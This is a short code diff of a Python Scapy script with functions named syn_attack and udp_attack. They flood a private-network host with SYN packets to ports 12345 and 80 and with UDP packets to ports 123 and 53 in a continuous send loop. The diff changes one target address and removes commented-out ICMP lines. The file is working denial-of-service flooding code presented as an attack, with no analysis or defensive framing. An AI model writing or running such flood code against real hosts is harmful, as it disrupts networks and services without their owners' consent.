@@ -7,8 +7,7 @@ import time
 
 def syn_attack():
     try:
-        p = IP(dst="192.168.0.105",id=1111,ttl=99)/TCP(sport=RandShort(),dport=[12345,80],seq=12345,ack=1000,window=1000,flags="S")
-        #icmp = IP(dst='192.168.0.105')/ICMP()
+        p = IP(dst="192.168.0.106",id=1111,ttl=99)/TCP(sport=RandShort(),dport=[12345,80],seq=12345,ack=1000,window=1000,flags="S")
 
         print('sending packets...')
         ans,unans = srloop(p)
@@ -23,7 +22,6 @@ def syn_attack():
 def udp_attack():
     try:
         p = IP(dst="192.168.0.105",id=1111,ttl=99)/UDP(sport=RandShort(),dport=[123,53])
-        #icmp = IP(dst='192.168.0.105')/ICMP()
 
         print('sending packets...')
         ans,unans = srloop(p)
